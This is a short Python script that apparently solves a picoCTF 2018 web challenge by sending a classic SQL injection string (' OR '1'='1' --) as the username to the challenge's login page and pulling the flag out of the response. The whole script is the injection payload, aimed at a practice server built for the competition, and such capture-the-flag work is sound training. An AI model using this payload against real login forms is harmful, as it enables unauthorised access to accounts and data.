#!/usr/bin/env python
import requests
import re

r = requests.post('http://2018shell.picoctf.com:52012/login.php', data = {'username': "' OR '1'='1' --"})

print(re.search(r'picoCTF{.+}', r.text)[0])